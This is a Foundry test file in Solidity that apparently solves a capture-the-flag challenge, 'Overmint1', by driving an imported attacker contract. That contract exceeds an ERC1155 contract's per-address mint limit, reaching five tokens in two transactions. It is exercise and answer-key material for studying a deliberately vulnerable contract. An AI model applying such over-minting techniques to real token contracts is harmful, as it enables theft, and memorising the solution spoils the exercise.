// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/test.sol";
import {Overmint1_ERC1155} from "../src/Overmint1ERC1155.sol";
import {Overmint1_ERC1155_Attacker} from "../src/Overmint1ERC1155Attacker.sol";

contract Overmint1Test is Test {
    Overmint1_ERC1155 public overmint1;
    Overmint1_ERC1155_Attacker  public attacker;

    function setUp() public {
        overmint1 = new Overmint1_ERC1155();
        attacker = new Overmint1_ERC1155_Attacker(overmint1);
    }

    function testMintMultipleNFTs() public {
        overmint1.mint(0, "0x20");
        overmint1.mint(0, "0x20");
        assertEq(overmint1.amountMinted(address(this), 0), 2);
    }

    // @note - has to be done in less than 3 txs (2 or less)
    // @note - balanceOf[id:0, count=5] for the attacker to solve.
    function testsolveOvermint1() public {
        attacker.attack();
        overmint1.mint(0, "0x20");
        overmint1.mint(0, "0x20");
        attacker.safeTransferFrom(address(attacker), address(overmint1), 0, 2, "0x20");
        assertEq(overmint1.success(address(attacker), 0), true);
    }

    function onERC1155Received(address, address, uint256, uint256, bytes memory) public virtual returns (bytes4) {
        return this.onERC1155Received.selector;
    }
}
